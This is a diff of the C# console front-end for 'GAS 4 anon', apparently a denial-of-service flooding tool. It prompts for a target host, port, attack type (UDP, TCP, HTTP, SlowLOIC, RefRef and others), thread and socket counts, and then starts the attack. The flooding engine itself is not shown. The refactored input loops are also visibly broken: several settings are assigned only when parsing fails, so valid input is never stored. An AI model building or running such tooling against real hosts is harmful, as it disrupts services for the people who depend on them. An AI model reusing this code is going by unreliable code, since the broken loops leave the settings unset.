@@ -10,7 +10,7 @@ using System.Text.RegularExpressions;
      * --Исправлен дизайнъ
      * --Создана иконка :)
      * Что не сделано:
-     * --Не сделана проверка на правильный ввод параметров по региксам. Сейчас вылетает с эксепшенами.
+     * --Не сделана проверка на правильный ввод параметров по рекексам. Сейчас вылетает с эксепшенами.
      * --Определение языка системы.
      * --Перевод на русский язык в рускоязычных системах.
      */
@@ -20,11 +20,13 @@ namespace GAS.TUI
     class Program
     {
         static DateTime d;
-        static string[] Blacklist = new string[] { "epicm.org", "localhost","127.0.0", "192.168."};
+        static string[] Blacklist = new string[] { "epicm.org", "localhost", "127.0.0", "192.168." };
         static GAS.Core.Manager Core = new GAS.Core.Manager();
-      
+        static int num = 1;
         public static void Main(string[] args)
         {
+            int tmp_int_parse = 0;
+            bool tmp_bool_parse = false;
             try { Console.Title = "GAS for urkaine"; }
             catch { }
             #region Detect oS
@@ -47,116 +49,55 @@ namespace GAS.TUI
 
                 }
             #endregion
-                 
-            #region Select target
+            #region Info
             Console.ForegroundColor = ConsoleColor.Cyan;
-            Console.WriteLine("###############################################");
-            Console.WriteLine("#                                             #");
-            Console.WriteLine("#  GAS 4 anon by http://github.com/kasthack   #");
-            Console.WriteLine("#                         fork by STAM  1.0   #");
-            Console.WriteLine("###############################################");
+            Console.WriteLine("###############################################" +
+                              Environment.NewLine +
+                              "#                                             #" +
+                              Environment.NewLine +
+                              "#  GAS 4 anon by http://github.com/kasthack   #" +
+                              Environment.NewLine +
+                              "#                         fork by STAM  1.0   #" +
+                              Environment.NewLine +
+                              "###############################################");
             Console.ForegroundColor = ConsoleColor.White;
             Console.WriteLine("Some notes:");
             Console.WriteLine("1. It is unstable designed fork.");
-            Console.WriteLine("2. In square brackets are default settings.");
+            Console.WriteLine("2. Default settings are  in square brackets ");
             Console.WriteLine("3. Contact us for bugfix.");
-            Console.WriteLine("");
-            Console.WriteLine("TO DO:");
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("1. Сделать проверку на правильность ввода!\r\n2.Проверка языка системы.\r\n3.При русском языке - русский текст!");
-            Console.ForegroundColor = ConsoleColor.Yellow; 
-            Console.WriteLine("                                  [Press Enter]");
-            Console.ForegroundColor = ConsoleColor.White; 
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("\t\t\t\t  [Press Enter]");
+            Console.ForegroundColor = ConsoleColor.White;
             Console.ReadLine();
             Console.Clear();
-            Console.ForegroundColor = ConsoleColor.Yellow; 
-            Console.WriteLine("1. Select target [www.example.com]:");
-            Console.ForegroundColor = ConsoleColor.White; 
-            temp = Console.ReadLine();
-            temp = (temp == "" ? "www.example.com" : temp);
-            foreach(string s in Blacklist)
-                if (temp.ToLower().Contains(s))
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("U SUK COX");
-                    Environment.Exit(666);
-                }
-            bool IPOK = Core.LockOn(temp);
-            if (!IPOK)
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("Wrong Target!");
-                Environment.Exit(1);
-            }
             #endregion
-            #region GetParams
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("(!)Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite);
-            Console.ForegroundColor = ConsoleColor.White;
-            if (Console.ReadLine().ToLower() == "y")
+            while (!GetHost()) ;
+            #region GetParam
+            if (_q(String.Format("Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite)).Trim().ToLower() == "y")
                 Core.Subsite = Console.ReadLine();
-            Console.ForegroundColor = ConsoleColor.Yellow; 
-            Console.WriteLine("2. Enter port[80]:");
-            Console.ForegroundColor = ConsoleColor.White;
-            Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
-            #region by STAM проверка на правильность ввода
-            /*
-               try
-                 {
-                 
-                 }
-               catch
-              {
-                   Console.ForegroundColor = ConsoleColor.Red;
-                   Console.WriteLine("[Invalid entry! Reenter]:");
-                   Console.ForegroundColor = ConsoleColor.White;
-                   Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
-            
-             * не помню как создать проверку или бесконечное предложение ввести только число.
-             * Можно и с помощью региксов.
-              
-                }*/
-            #endregion
-            Console.ForegroundColor = ConsoleColor.Yellow; 
-            Console.WriteLine("3. Select attack type [ReCoil]:\r\n(UDP|TCP|HTTP|ReCoil|SlowLOIC|RefRef|AhrDosme|Post|TMOF)");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), (temp=Console.ReadLine())==""?"ReCoil":temp);
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("4. Enter thread count [50]:");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.Threads = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("5. Enter sockets per thread [50]");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.SPT = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("6. Enter delay [0]:");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.Delay = int.Parse((temp = Console.ReadLine()) == "" ? "0" : temp);
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("7. Enter timeout[30]:");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.Timeout = int.Parse((temp = Console.ReadLine()) == "" ? "30" : temp);
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("8. USE Get [true]:");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.USEGet = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("9. USE GZIP [true]:");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.UseGZIP = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("10. Wait For Response [false]:");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.WaitForResponse = bool.Parse((temp = Console.ReadLine()) == "" ? "false" : temp);
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("11. Append RANDOMC hars [true]:");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.AppendRANDOMChars = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("12. Append RANDOM Chars 2 Url [true]:");
-            Console.ForegroundColor = ConsoleColor.White; 
-            Core.AppendRANDOMCharsUrl = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
+            while (!int.TryParse((temp = _q("Enter port[80]:")) == "" ? "80" : temp, out tmp_int_parse))
+                _e("Bad port");
+            Core.Port = tmp_int_parse;
+            var mt = typeof(GAS.Core.AttackMethod);
+            Core.Method = (GAS.Core.AttackMethod)Enum.Parse(mt, (temp = _q(String.Format("Select attack type [ReCoil]:\r\n({0})", String.Join("|", Enum.GetNames(mt))))) == "" ? "ReCoil" : temp);
+            while (!int.TryParse((temp = _q("Enter thread count [50]:")) == "" ? "50" : temp, out tmp_int_parse))
+                Core.Threads = tmp_int_parse;
+            while (!int.TryParse((temp = _q("Enter sockets per thread [50]")) == "" ? "50" : temp, out tmp_int_parse))
+                Core.SPT = tmp_int_parse;
+            while (!int.TryParse((temp = _q("Enter delay [0]:")) == "" ? "0" : temp, out tmp_int_parse))
+                Core.Delay = tmp_int_parse;
+            while (!int.TryParse((temp = _q("Enter timeout[30]:")) == "" ? "30" : temp, out tmp_int_parse))
+                Core.Timeout = tmp_int_parse;
+            while (!bool.TryParse((temp = _q("USE Get [true]:")) == "" ? "true" : temp, out tmp_bool_parse))
+                Core.USEGet = tmp_bool_parse;
+            while (!bool.TryParse((temp = _q("USE GZIP [true]:")) == "" ? "true" : temp, out tmp_bool_parse))
+                Core.UseGZIP = tmp_bool_parse;
+            while (!bool.TryParse((temp = _q("Wait For Response [false]:")) == "" ? "false" : temp, out tmp_bool_parse))
+                Core.WaitForResponse = tmp_bool_parse;
+            while (!bool.TryParse((temp = _q("Append RANDOM Chars [true]:")) == "" ? "true" : temp, out tmp_bool_parse))
+                Core.AppendRANDOMChars = tmp_bool_parse;
+            while (!bool.TryParse((temp = _q("Append RANDOM Chars 2 Url [true]:")) == "" ? "true" : temp, out tmp_bool_parse))
+            Core.AppendRANDOMCharsUrl = tmp_bool_parse;
             Console.WriteLine("Starting attack...");
             #endregion
             #region Start and stop
@@ -169,24 +110,24 @@ namespace GAS.TUI
             t.Start();
             //attack started
             #region Cool UI
-                Console.SetCursorPosition(0, 0);
-                Console.ForegroundColor = ConsoleColor.Yellow; 
-                Console.WriteLine("###############################################"); 
-                Console.ForegroundColor = ConsoleColor.Green;
-                try
-                {
-                    Console.SetCursorPosition(0, 6);
-                }
-                catch { }
-                Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine("------------------------------------------------");
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("Attacking...");
-                Console.ForegroundColor = ConsoleColor.Yellow;
-                
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("Press Enter stop attack and exit");
-                Console.ForegroundColor = ConsoleColor.Green;
+            Console.SetCursorPosition(0, 0);
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("------------------------------------------------");
+            Console.ForegroundColor = ConsoleColor.Green;
+            try
+            {
+                Console.SetCursorPosition(0, 6);
+            }
+            catch { }
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("------------------------------------------------");
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("Attacking...");
+            Console.ForegroundColor = ConsoleColor.Yellow;
+
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine("Press Enter stop attack and exit");
+            Console.ForegroundColor = ConsoleColor.Green;
             #endregion
             Console.ReadLine();
             Console.WriteLine("\r\n\r\n\r\n\r\n------------------------------------------------\r\nExiting, please wait...");
@@ -195,7 +136,39 @@ namespace GAS.TUI
             Console.Clear();
             #endregion
         }
-
+        static string _q(string q)
+        {
+            var con_c = Console.ForegroundColor;
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            string s = "";
+            Console.WriteLine("{0}. {1}", num++, q);
+            Console.Write('>');
+            Console.ForegroundColor = con_c;
+            s = Console.ReadLine();
+            return s;
+        }
+        static void _e(string e)
+        {
+            var con_c = Console.ForegroundColor;
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine(e);
+            Console.ForegroundColor = con_c;
+        }
+        static bool GetHost()
+        {
+            string temp = _q("Select target [www.example.com]:");
+            temp = (temp == "" ? "www.example.com" : temp);
+            foreach (string s in Blacklist)
+                if (temp.ToLower().Contains(s))
+                {
+                    _e("U SUK COX");
+                    return false;
+                }
+            bool IPOK = Core.LockOn(temp);
+            if (!IPOK)
+                _e("Wrong Target!");
+            return IPOK;
+        }
         static void t_Elapsed(object sender, ElapsedEventArgs argZ)
         {
             int x = Console.CursorLeft, y = Console.CursorTop, w = Console.WindowWidth;
@@ -208,8 +181,6 @@ namespace GAS.TUI
                 Console.SetCursorPosition(0, 3);
             }
             catch { }
-           
-
             Console.WriteLine(e);
             Console.WriteLine(e);
             try
